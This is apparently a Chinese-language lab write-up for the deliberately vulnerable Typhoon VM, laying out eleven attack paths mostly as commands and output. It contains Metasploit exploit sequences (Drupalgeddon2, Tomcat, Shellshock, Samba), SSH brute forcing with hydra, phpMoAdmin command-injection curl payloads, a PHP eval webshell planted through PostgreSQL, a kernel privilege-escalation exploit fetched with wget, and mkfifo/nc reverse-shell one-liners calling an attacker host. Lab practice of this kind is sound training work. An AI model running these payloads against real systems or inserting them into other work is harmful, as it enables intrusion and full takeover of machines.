VMware双击打开，nat模式运行即可！


--------------------------------------------
--------------------------------------------
1、nmap 192.168.253.0/24 -sP

Nmap scan report for localhost (192.168.253.135)
Host is up (0.0018s latency).


--------------------------------------------
--------------------------------------------
2、nmap 192.168.253.135 -p- -A

21/tcp    open  ftp         vsftpd 3.0.2
ftp-anon: Anonymous FTP login allowed (FTP code 230)ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp    open  ssh         OpenSSH 6.6.1p1
25/tcp    open  smtp        Postfix smtpd
53/tcp    open  domain      ISC BIND 9.9.5-3 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3-Ubuntu
80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/mongoadmin/
110/tcp   open  pop3?
111/tcp   open  rpcbind     2-4 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp   open  imap        Dovecot imapd
|_ssl-date: TLS randomness does not represent time
445/tcp   open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)
631/tcp   open  ipp         CUPS 1.7
|_http-server-header: CUPS/1.7 IPP/2.1
|_http-title: Bad Request - CUPS v1.7.2
993/tcp   open  ssl/imaps?

...........

nmap输出显示各种开放端口：21(ftp)、22(ssh)、25(smtp)、53(domain)、80(http)、110(pop3)、111(rpcbind)、139(netbios-ssn)、 143(imap)、445(netbios-ssn)、631(ipp)、993(ssl/imaps)、995(ssl/pop3)、2049(nfs_acl)、3306(mysql)、5432(postgrespl)、8080(http) 


--------------------------------------------
--------------------------------------------
3、web目录枚举

dirb http://192.168.253.135/

http://192.168.253.135/cms/
http://192.168.253.135/drupal/
http://192.168.253.135/phpmyadmin/
http://192.168.253.135/javascript/
http://192.168.253.135/robots.txt

通过dirb对目标网站进行扫描发现存在phpmyadmin以及robots.txt和drupal，cms等目录文件


--------------------------------------------
--------------------------------------------
4、攻击路径一：drupal漏洞利用   (项目十四)

msfconsole
search drupal
use exploit/unix/webapp/drupal_drupalgeddon2
set rhosts 192.168.253.135
set TARGETURI /drupal
run

成功拿到反弹shell！

shell
/bin/bash -i

uname -a
Linux typhoon.local 3.13.0-32-generic

searchsploit 3.13.0
searchsploit -m linux/local/37292.c
wget http://192.168.253.138:8081/37292.c

gcc 37292.c -o dayu
chmod +x dayu
./dayu

成功拿到root权限！


--------------------------------------------
--------------------------------------------
5、攻击路径二：ssh端口爆破

发现端口22开放，其版本为openssh 6.6.1p1
利用OpenSSH新爆出的CVE爆出目标主机的用户，这对特定的用户爆破密码，建议爆破1000条！

searchsploit openssh
OpenSSH 2.3 < 7.7 - Username Enumeration

利用msf进行账号枚举。这里的用户名字典我采用：
msfconsole
search ssh/ssh_
use auxiliary/scanner/ssh/ssh_enumusers
set rhosts 192.168.253.135
set rport 22
set threads 20
set USER_FILE /root/Desktop/66/namelist.txt
run
[+] 192.168.253.135:22 - SSH - User 'admin' found

可以看到成功枚举出admin账号，通过hydra对靶机的ssh进行爆破!


hydra -l admin -P /root/Desktop/rockyou.txt 192.168.253.135 ssh

[22][ssh] host: 192.168.253.135   login: admin   password: metallica

成功爆破了ssh，用户名为：admin 密码为：metallica

ssh admin@192.168.253.135
metallica

sudo bash



--------------------------------------------
--------------------------------------------
6、攻击路径三：PHPMOADMIN

phpMoAdmin 是一个用PHP 开发的在线MongoDB 管理工具，可用于创建、删除和修改数据库和索引，提供视图和数据搜索工具，提供数据库启动时间和内存的统计，支持JSON 格式数据的导入导出。


访问：http://192.168.1.104/robots.txt

访问/robots.txt，是一个mogondb的WebUI管理：

访问：
http://192.168.253.135/mongoadmin/

看到一个用于管理公开的Mongo实例的Web界面, 稍后点击几下，您将看到SSH帐户的凭据

查看版本号：
http://192.168.253.135/mongoadmin/index.php?action=getStats
----------------------
version

    mongo: 3.0.15 (64-bit)
    mongoPhpDriver: 1.6.16
    phpMoAdmin: 1.0.9
    php: 5.5.9-1ubuntu4.26 (64-bit)
    gitVersion: b8ff507269c382bc100fc52f75f48d54cd42ec3b

OpenSSLVersion: OpenSSL 1.0.1f 6 Jan 2014
sysInfo: Linux ip-10-71-195-23 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 BOOST_LIB_VERSION=1_49
versionArray
----------------------
是1.0.9，Google搜一搜，没想到一搜就是两个RCE的payload：

phpMoAdmin 1.0.9 exploit
https://www.exploit-db.com/exploits/36251


还发现两个rce：
curl http://192.168.253.135/mongoadmin/index.php -d "object=1;system('whoami');//"

curl 'http://192.168.253.135/mongoadmin/index.php?collection=admin&action=listRows&find=array();passthru("whoami");exit;'


比较卡，或者在界面多点击几次后等待会出现creds选项：
http://192.168.253.135/mongoadmin/index.php?db=credentials&action=listRows&collection=creds

发现：
[username] => typhoon
[password] => 789456123

ssh typhoon@192.168.253.135
lsb_release -a
发现是：ubuntu 14.04
也是和上面一样对应37292提权即可！



--------------------------------------------
--------------------------------------------
6、攻击路径四：LotusCMS漏洞利用

LotusCMS将最前沿的设计和设计集成到了最被忽视的CMS生态位之一-无数据库Web设计和开发中。LotusCMS是免费的，而不仅仅是免费的，它是根据“通用公共许可证”授权的，根据该许可证，您可以复制，更改和重新分发此软件以满足您的需求！


访问cms点击login：
http://192.168.253.135/cms/index.php?system=Admin

msfconsole
search lcms
use exploit/multi/http/lcms_php_exec
set rhosts 192.168.253.135
set rport 80
set uri /cms/
run
成功拿到反弹shell！



--------------------------------------------
--------------------------------------------
6、攻击路径五：Tomcat漏洞利用（exp）

Tomcat是一个应用服务器。他可以运行你按照J2EE中的Servlet规范编写好的Java程序。
简单的说它是一个Web网站的运行容器，把你写好的网站放进去就可以运行。


http://192.168.253.135:8080

发现是tomcat7的站，直接点击manager使用默认登录：
tomcat
tomcat


msfconsole
use exploit/multi/http/tomcat_mgr_upload
set HttpUsername tomcat
set HttpPassword tomcat
set rhosts 192.168.253.135
set rport 8080
run

成功拿到反弹shell！


--------------------------------------------
--------------------------------------------
7、攻击路径六：Tomcat漏洞利用（后台部署）


msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.253.138 LPORT=4455 -f war -o    dayu.war

7z l dayu.war    ----可以看到evulll.war具体内容

部署后：
nc -vlp 4455
http://192.168.253.135:8080/dayu/quktqjzs.jsp


成功拿到反弹shell！


--------------------------------------------
--------------------------------------------
8、攻击路径七：Shellshock漏洞利用  （项目九）

Shellshock，又称Bashdoor，是在Unix中广泛使用的Bash shell中的一个安全漏洞，首次于2014年9月24日公开。


nikto -h http://192.168.253.135

+ OSVDB-112004: /cgi-bin/test.sh: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).

发现存在Shellshock漏洞！！！

msfconsole
search shellshock
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set payload linux/x86/shell/reverse_tcp
set lhost 192.168.253.138
set rhosts 192.168.253.135
set targeturi /cgi-bin/test.sh
run

成功拿到反弹shell！

--------------------------------------------
--------------------------------------------
9、攻击路径八：NFS漏洞利用

NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。

search nfs
use auxiliary/scanner/nfs/nfsmount
set rhosts 192.168.253.135
/typhoon [*]   ---挂载了该目录

mkdir /tmp/typhoon
mount -t nfs 192.168.253.135:/typhoon /tmp/typhoon
cat secret      
test file
<rec0nm4st3r> R3c0n_m4steeeee3er_fl4g </rec0nm4st3r>

或者enum4linux查看！

--------------------------------------------
--------------------------------------------
10、攻击路径九：5432 PostgreSQL漏洞利用

PostgreSQL是一个功能非常强大的、源代码开放的客户/服务器关系型数据库管理系统（RDBMS）。

尝试爆破PostgreSQL数据库用户名密码：

use auxiliary/scanner/postgres/postgres_login
set rhosts  192.168.253.135
run
[+] 192.168.253.135:5432 - Login Successful: 
postgres
postgres@template1

psql -h 192.168.253.135 -U postgres
postgres@template1

......无法登录，尝试postgres为密码成功登录！

1）列出目录
select pg_ls_dir('./');
发现(16 行记录)

2）读取权限允许的文件
select pg_read_file('postgresql.conf',0,1000);

3）读取/etc/passwd第一行
DROP TABLE if EXISTS MrLee;CREATE TABLE MrLee(t TEXT);COPY MrLee FROM '/etc/passwd';select * from MrLee limit 1 offset 0;

4）直接读出所有数据
SELECT * FROM MrLee;
按下Q退出当前页面！

5）利用数据库写文件
INSERT INTO MrLee(t) VALUES('hello,MrLee');
COPY MrLee(t) TO '/tmp/MrLee';

SELECT * FROM MrLee;
读取发现：
hello,MrLee
(46 行记录)
显示里面有一句hello,MrLee，成功写入文件，并成功读取到源内容

6）创建OID，清空内容
SELECT lo_create(998);
delete from pg_largeobject where loid=998;

7）接下来就是写入木马使用hex---小葵
<?php @eval($_POST['d']);?>
0x3C3F70687020406576616C28245F504F53545B2764275D293B3F3E

insert into pg_largeobject (loid,pageno,data) values(998, 0, decode('3C3F70687020406576616C28245F504F53545B2764275D293B3F3E', 'hex'));

select lo_export(998,'/var/www/html/dayu.php');

http://192.168.253.135/shell.php




--------------------------------------------
--------------------------------------------
11、攻击路径十：Samba远程代码执行漏洞（CVE-2017-7494）445端口

Samba 是在 Linux 和 UNIX 系统上实现 SMB 协议的一个软件，不少 IoT 设备也使用了 Samba。2017年5月24日 Samba 发布了 4.6.4 版本，修复了一个严重的远程代码执行漏洞，漏洞编号 CVE-2017-7494，攻击者可以利用该漏洞在目标服务器上执行任意代码。

漏洞利用条件：
1. 服务端共享目录有访问权限。
2. 需要对服务器上写一个恶意文件并知道该文件的物理路径。
影响版本：
Samba 3.5+  <4.6.4  <4.5.10  <4.4.14
注：可使用’smbd -V’命令查看 Samba 的版本信息。


search CVE-2017-7494
use exploit/linux/samba/is_known_pipename
set rhosts 192.168.253.135
run

[*] Command shell session 4 opened (192.168.253.138:43849 -> 192.168.253.135:445) at 2022-07-21 03:50:47 -0400

id
uid=0(root) gid=0(root) groups=0(root)
直接获取root权限！！



--------------------------------------------
--------------------------------------------
12、攻击路径十一：25端口DNS漏洞利用

尝试目标DNS区域传送攻击！


└─$ telnet 192.168.253.135 25                                                                                                                     1 ⨯
Trying 192.168.253.135...
Connected to localhost.
Escape character is '^]'.
220 typhoon ESMTP Postfix (Ubuntu)
EHLO kali.local       -----客户端为标识自己的身份而发送的命令（通常带域名）
250-typhoon
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250 DSN
VRFY root@typhoon.local      ----确认在邮件传递过程中可以使用邮箱
252 2.0.0 root@typhoon.local


DNS 服务器可能正在服务 typhoon.local，让我们尝试执行区域传输！


dig （域信息搜索器）命令是一个用于询问DNS 域名服务器的灵活的工具。 它执行DNS 搜索，显示从受请求的域名服务器返回的答复。 多数DNS 管理员利用dig 作为DNS 问题的故障诊断，因为它灵活性好、易用、输出清晰。 虽然通常情况下dig 使用命令行参数，但它也可以按批处理模式从文件读取搜索请求。

涉及dig一个重要的命令axfr，axfr是q-type类型的一种，axfr类型是Authoritative Transfer的缩写，指请求传送某个区域的全部记录。

只要欺骗dns服务器发送一个axfr请求过去，如果该dns服务器上存在该漏洞，就会返回所有的解析记录值。

dig axfr @192.168.253.135 typhoon.local
calendar.typhoon.local.	3600	IN	CNAME	wwww.typhoon.local.

添加hosts：
192.168.253.135 calendar.typhoon.local

发现版本：
WebCalendar v1.2.4 (08 Aug 2011)

WebCalendar是一个基于Web的日历应用软件。可配置成单个用户日历，多用户日历或访问者可以浏览的事件日历。WebCalendar需要数据库支持可以是MySQL，Oracle，PostgreSQL， MSSQLServer，ODBC， Interbase。它的特性：当更新/新增/删除事件或事件即将发生时通过Email提醒，iCal/vCal导入/导出。支持LDAP与NIS用户身 份验证。支持把用户的日历事件添加到RSS中。支持简体中文等。


searchsploit webcalendar
发现exploits/linux/webapps/18797.rb可以利用！

msfconsole
search webcalendar
use exploit/linux/http/webcalendar_settings_exec
set rhosts calendar.typhoon.local
set vhost calendar.typhoon.local
set targeturi /
set payload cmd/unix/reverse_python
set lhost 192.168.253.138
exploit

成功获得反弹shell！



--------------------------------------------
--------------------------------------------
13、拓展思路：内部信息收集后

37292.c提权

在/tab/目录下发现一个文件所有者为root、权限为777的sh文件。

echo "mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.253.138 8888 >/tmp/f" > script.sh
nc -vlp 8888
./script.sh


rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f





























